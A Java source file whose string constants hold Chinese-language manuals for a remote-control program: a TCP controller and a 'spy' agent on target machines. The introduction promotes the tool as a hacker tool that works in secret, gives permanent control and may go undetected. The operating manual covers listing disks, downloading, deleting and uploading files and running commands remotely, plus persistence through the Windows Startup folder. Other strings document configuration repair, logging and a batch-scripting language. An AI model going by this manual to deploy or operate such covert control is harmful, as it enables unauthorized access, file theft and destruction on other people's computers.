package Commander;

public class Docment {
	public static final String OPB="	****************************************-命令远程控制中心操作手册-****************************************;\r\n" + 
			"\r\n" + 
			"	（C）Mrright;\r\n" + 
			"\r\n" + 
			"\r\n" + 
			"控制中心使用tcp协议向链接中的远程主机发送命令实现远程操控，并且能够实现多台主机的远程切换操控，所有的远程命令都是在连接主机\r\n" + 
			"\r\n" + 
			"之后才能进行的（使用link命令连接成功后会命令行开头会显示当前连接的远程主机IP和默认C盘）下面介绍以下命令的使用方法：控制中心\r\n" + 
			"\r\n" + 
			"的命令包含两大类：[远程命令]与[本地命令]\r\n" + 
			"	\r\n" + 
			"	【远程命令】：\r\n" + 
			"\r\n" + 
			"		远程命令必须使用link命令连接成功后才可操作dir ：打印当前主机的当前目录列表，默认目录为C盘，该命令拥有参数-dir，\r\n" + 
			"\r\n" + 
			"		用于打印出所有磁盘分区以及大小.entry ：该命令用于切换远程主机的“目标路径”，可以通过绝对路径和相对路径的方式，\r\n" + 
			"\r\n" + 
			"		在不清楚远程主机的目录结构时可以使用dir -all命令查看当前远程“目标路径”使用entry命令切换“目标目录”成功后，\r\n" + 
			"\r\n" + 
			"		控制中心的命令行开头的远程主机的“目标路径”会发生变化,此时说明你可以操作该目录中的文件，通过dir -all 查看“目\r\n" + 
			"\r\n" + 
			"		标目录”中的所有文件，此时你拥有两个操作文件的方法：getfile 和del ：getfile：获取指定的文件，该命令处于升级阶\r\n" + 
			"\r\n" + 
			"		段，不支持递归操作，不能捕获整个文件夹中的内容，只能获取单个，获取的文件将被保存到cd设置的目录下，cd命令属于本\r\n" + 
			"\r\n" + 
			"		地命令，接下来会介绍，put：该命令用于从“本地路径”的目录中发送指定文件到远程主机的“目标路径”del：该命令需要\r\n" + 
			"\r\n" + 
			"		跟一个文件名，或者目录，支持递归操作;put命令是用于从“本地路径”向当前远程主机的“目标路径”发送文件的命令，该\r\n" + 
			"\r\n" + 
			"		方法不能操作目录，只能操作单文件除此之外，还提供向远程主机发送命令的命令--run:将控制台命令输入到远程主机中并执\r\n" + 
			"\r\n" + 
			"		行，例如run mspaint就会打开远程计算机的画图板另外view命令也属于[远程命令]，必须在链接远程主机后才能使用。\r\n" + 
			"\r\n" + 
			"	【本地命令】：\r\n" + 
			"\r\n" + 
			"		该类型命令属于基本操作命令，该命令用于管理本地控制中心，在操作初期可以使用ls查看可以操作的主机ip，并通过link 命\r\n" + 
			"\r\n" + 
			"		令并输入主机ip进行链接，连接成功并得到控制权后，即可发送远程命令。该程序的运行端口为2366另外，补充一点，如果想\r\n" + 
			"\r\n" + 
			"		要对某台计算机进行绝对控制，那么你需要将spy程序放到远程主机的启动目录，但这不能通过远程操作完成（spy拥有管理员\r\n" + 
			"\r\n" + 
			"		权限则可以远程操作），除非你能以管理员身份打开对方的计算机，启动目录在C:\\ProgramData\\Microsoft\\Windows\\Start\r\n" + 
			"\r\n" + 
			"		 Menu\\Programs\\StartUp目录下。操作结束后记得使用quit命令退出程序;\r\n" + 
			"\r\n" + 
			"												lastdate:2019.06.12\r\n" + 
			"												author:Mrright";
	public static final String REPAIR_DOC="该文档记录properties的关键目录结构，该文件能帮助你手动修复配置文件\r\n" + 
			"  \r\n" + 
			"				对于配置文件的修改将会在下一次启动生效！\r\n" + 
			"  \r\n" + 
			"				properties ---\r\n" + 
			"					      |\r\n" + 
			"					       --logs --\r\n" + 
			"					      |\r\n" + 
			"					      |\r\n" + 
			"					       --startup --\r\n" + 
			"							   |\r\n" + 
			"							   |\r\n" + 
			"							    --setup 重要配置文件\r\n" + 
			"				\r\n" + 
			"  \r\n" + 
			"  \r\n" + 
			"				setup配置文件：该文件用于系统启动时的初始化配置文件，且没有该文件系统不能启动，\r\n" + 
			"  \r\n" + 
			"				为预防万一，下面将介绍该配置文件的具体内容，以及读取文件放置顺序。\r\n" + 
			"  \r\n" + 
			"				\r\n" + 
			"  \r\n" + 
			"				\r\n" + 
			"  \r\n" + 
			"				setup文件修复方式：\r\n" + 
			"  \r\n" + 
			"					该文件中配置了程序的基本信息，每一行数据都由一个数据名和数据值组成，中间由\r\n" + 
			"  \r\n" + 
			"				冒号(:)分开,该文件在写入的任何时候都不能有空格和其它符号，一条数据结束直接换行,在任\r\n" + 
			"  \r\n" + 
			"				何情况下，必须保证每行都有数据，并且按顺序放置，如果更改出错请按下列顺序表还原。\r\n" + 
			"  \r\n" + 
			"				\r\n" + 
			"  \r\n" + 
			"				-------------------------->配置数据顺序<----------------------------\r\n" + 
			"  \r\n" + 
			"				line 1:启动端口\r\n" + 
			"  \r\n" + 
			"				----------------------------->end<---------------------------------\r\n" + 
			"  \r\n" + 
			"				\r\n" + 
			"  \r\n" + 
			"				\r\n" + 
			"  \r\n" + 
			"											lastdate:2019/6/11";
	public static final String IM="	---------------------------->Remote operator<----------------------------\r\n  \r\n" + 
			"				\r\n  \r\n" + 
			"				\r\n  \r\n" + 
			"					想做一个黑客需要必备强大的命令能力，当然这一切都不是天生的，没接触过编程？\r\n  \r\n" + 
			"				没关系，感受一下，你会爱上命令控制计算机，所有人都习惯用鼠标操作，GUI操作当然方便，\r\n  \r\n" + 
			"				但命令永远比GUI操作更快捷，这也是很多黑客更喜欢在黑背景白字的界面敲命令的原因，其次，\r\n  \r\n" + 
			"				命令行比GUI开销小，你不需要很强劲的设备，这就是window系统仍然保留ｄｏｓ的重要原因之一，\r\n  \r\n" + 
			"				其实GUI的操作只是界面上不同，实际上底层实现是一样的。\r\n  \r\n" + 
			"					例如，使用GUI图形化用户界面删除文件是怎么样的？，选中文件－＞右击鼠标－＞\r\n  \r\n" + 
			"				找到删除选项，而命令行只需要一句：del 后面加上文件名，是不是很简单，当然，GUI在这一系列\r\n  \r\n" + 
			"				动作后同样执行了该命令，可以看出来，图形化界面操作不仅慢，而且对设备配置要求也比较苛刻，\r\n  \r\n" + 
			"				当然，图形化界面不需要学习，即可操作，但说了这么多命令的好处，我相信渴望技术的同学已经\r\n  \r\n" + 
			"				想入手命令操作了，而接下来的程序不仅功能强大，更能让你感受到命令其实很简单，如果你渴望\r\n  \r\n" + 
			"				技术就从这里开始吧：\r\n  \r\n" + 
			"					这是一款能够控制远程计算机的程序，中文命名：<<远程控制中心>>(下面简称控制中心)，\r\n  \r\n" + 
			"				使用它你可以同时控制多个远程机器，查看目标的磁盘以及文件列表，并且可以下载远程主机的文件，\r\n  \r\n" + 
			"				也可以删除远程主机的文件项目，控制中心可以向远程主机发送文件，还可以将自己写的程序远程编译，\r\n  \r\n" + 
			"				运行等等操作，并且这一切都是秘密进行的，总的来说，它可以操作远程主机上磁盘的文件，更可以\r\n  \r\n" + 
			"				永久控制远程电脑，此软件的设计理念是从不压缩软件功能，它可以向远程主机发送系统命令并让它执行，\r\n  \r\n" + 
			"				例如远程关机，设置计划任务等，打开记事本,计算机等等，当然这一切都是要保证合法情况下进行的，\r\n  \r\n" + 
			"				控制中心自带操作手册，并且方法步骤也非常清楚，适合所有人，该软件从第一次启动将会记录所有日志，\r\n  \r\n" + 
			"				它会记录系统启动状态等，以及获取的文件，执行的命令等等，该软件部分中文，除了个别消息为英文，\r\n  \r\n" + 
			"				当然如果有人非常介意，我们会对它全面汉化，但不对汉语进行任何翻译，命令中心附带一个spy程序，\r\n  \r\n" + 
			"				该程序的中文译名为：间谍，它就负责在远程主机电脑中等待控制中心向它发起的命令并执行，\r\n  \r\n" + 
			"				如果你是小白，这里我就需要解释下，没有什么软件可以凭空控制谁，必须要布置“环境”，另外，\r\n  \r\n" + 
			"				该程序是基于java开发的，需要布置java运行环境，如果你有办法碰到目标主机这点非常容易，当然，\r\n  \r\n" + 
			"				前提还是在合法情况下，毕竟间谍在专业人士看来识破其实没那么复杂，但对于程序不了解的人来讲\r\n  \r\n" + 
			"				spy可能永远不会被发现，如果想要永久控制，获取该软件，它会告诉你怎么做。\r\n  \r\n" + 
			"				另外本软件基于TCP协议进行通讯，\r\n  \r\n" + 
			"				开发者：China Man (C)Mrright，如果您有什么好的建议可以投至pmrright@outlook.com邮箱，后续将\r\n  \r\n" + 
			"				持续更新新功能和文档。\r\n  \r\n" + 
			"				\r\n  \r\n" + 
			"												（C）Mrright \r\n  \r\n" + 
			"												lastdate 2019.6.2";
	public static final String LOG_H="------------------------------------->>日志系统<<-------------------------------------\r\n" + 
			"\r\n" + 
			"	日志文件储存路径在properties/logs/目录下，请不要手动修改这些文件，如果系统检测到这些\r\n" + 
			"\r\n" + 
			"文件被修改过，将会自动删除这些文件（熟悉原则）\r\n" + 
			"\r\n" + 
			"\r\n" + 
			"日志文件的生成方式：\r\n" + 
			"\r\n" + 
			"	日志文件不限制大小，每月自动生成新的日志文件，系统启动后会对日志进行检查并整理过时的日\r\n" + 
			"\r\n" + 
			"志文件（超过1年会删除旧日志）日志系统通常不提供关闭方式，如果日志系统出现问题，在启动程序时会\r\n" + 
			"\r\n" + 
			"询问用户是否继续启动系统不记录日志文件，当然如果用户需要日志文件并且希望快速修复此问题，则可以\r\n" + 
			"\r\n" + 
			"直接移动该程序的文件到其它目录下即可，而日志系统不能正常启动的根本原因是：和该程序同级的目录下\r\n" + 
			"\r\n" + 
			"有properties/logs这个目录,并且logs目录中还有至少一个非空的目录，如果满足这些条件日志系统拒绝\r\n" + 
			"\r\n" + 
			"写入日志。\r\n" + 
			"								lastdate:2019.06.12\r\n" + 
			"								author：Mrright";
	public static final String SCRIPT_CODING="	---------------------------《自动操控与脚本编写》---------------------------\r\n" + 
			"作者：Mrright\r\n" + 
			"功能：自动管理与运行\r\n" + 
			"\r\n" + 
			"		该功能提供给用户以自动化方式执行RO命令，使用者可以根据自己的需求编写脚本\r\n" + 
			"	实现自动操作，可以实现大批量机器的自动部署环境，并且可以制定脚本执行计划，下面将\r\n" + 
			"	从打开该面板开始认识该模块，可以使用macro命令来打开脚本管理器，于是你可以看到加载\r\n" + 
			"	的所有脚本，最下面一栏是菜单，你可以选择一项进行相应的操作，只需输入旁边的符号就可\r\n" + 
			"	以执行操作，例如输入r，系统会提示输入“目标”，此时输入对应的对象名（文件）就可以\r\n" + 
			"	执行操作，接下来你将会学到脚本编写：\r\n" + 
			"\r\n" + 
			"	输入N新建脚本会弹出记事本程序，编辑完成后Ctrl+s保存后关掉记事本即可。\r\n" + 
			"\r\n" + 
			"语法》》：\r\n" + 
			"	脚本语言必须每句语句占一行，一行不允许出现两行语句\r\n" + 
			"	注释：\r\n" + 
			"	\r\n" + 
			"	RO中的脚本使用#表示注释，#后面的内容系统将不会执行该部分内容，脚本注释只允许出现在一\r\n" + 
			"	行的开头并且顶格，前面不允许有空格字符\r\n" + 
			"	例如》》：\r\n" + 
			"\r\n" + 
			"	#这是我的第一个RO脚本\r\n" + 
			"\r\n" + 
			"	上面这句话在系统中不会被执行\r\n" + 
			"	变量》》：\r\n" + 
			"	RO中的脚本使用$+名字表示变量的声明\r\n" + 
			"	\r\n" + 
			"		变量声明：$name=Mrright\r\n" + 
			"	声明变量时需要立即赋值，变量必须使用实际值进行赋值操作，赋值操作将右边的值赋值给左\r\n" + 
			"	边的变量，不能使用变量对变量进行赋值，例如：\r\n" + 
			"		错误赋值操作：$name=$a\r\n" + 
			"	这样的赋值将会被系统认定为值而不是变量，变量分为普通变量和参数变量，普通变量存储固有\r\n" + 
			"	的值，而参数变量则存储一个参数列表，参数变量可以使用一个绝对路径的文件名进行传递，\r\n" + 
			"	文件为文本文件，每一行为一个参数，\r\n" + 
			"		参数变量声明方式：$name={文件的绝对路径}\r\n" + 
			"	\r\n" + 
			"	语句》》：\r\n" + 
			"	\r\n" + 
			"	语句为真实执行体，语句通常和变量同时使用，例如：\r\n" + 
			"	$name=Mrright\r\n" + 
			"	\r\n" + 
			"	echo 你好，我是$name					解释：echo是输出打印语句\r\n" + 
			"\r\n" + 
			"	输出结果：你好，我是Mrright\r\n" + 
			"\r\n" + 
			"	这里的变量使用了普通变量，而如果使用参数变量那么这句语句将可能输出多次，例如有一个参数\r\n" + 
			"	列表的绝对路径为D:/project/name.txt，该文件中共有4个参数，分别为Jobs，Mrright,Dennis\r\n" + 
			"	和Carter，我们可以创建一个参数变量来使用它：\r\n" + 
			"	$name={D:/project/name.txt}\r\n" + 
			"	echo 你好，我是$name\r\n" + 
			"	\r\n" + 
			"	输出结果：\r\n" + 
			"		你好，我是Jobs\r\n" + 
			"		你好，我是Mrright\r\n" + 
			"		你好，我是Dennis\r\n" + 
			"		你好，我是Carter\r\n" + 
			"	这时，一条语句被执行了四次，而如果一条语句中包含两个或多个参数列表时，理论上会执行参数\r\n" + 
			"	1*参数2次，例如如果一个参数列表有4个参数，而另一个参数列表有3个，那么会执行12次，但是去\r\n" + 
			"	除重复执行的只会执行11次，而特别注意的是，单句中不可引用相同名称的多个变量，例如下面的\r\n" + 
			"	语句是不被允许的：\r\n" + 
			"		echo 我是$name $name				解释：引用相同的变量不被允许\r\n" + 
			"\r\n" + 
			"\r\n" + 
			"								lastUpdate:2019/8/25\r\n" + 
			"	";
}
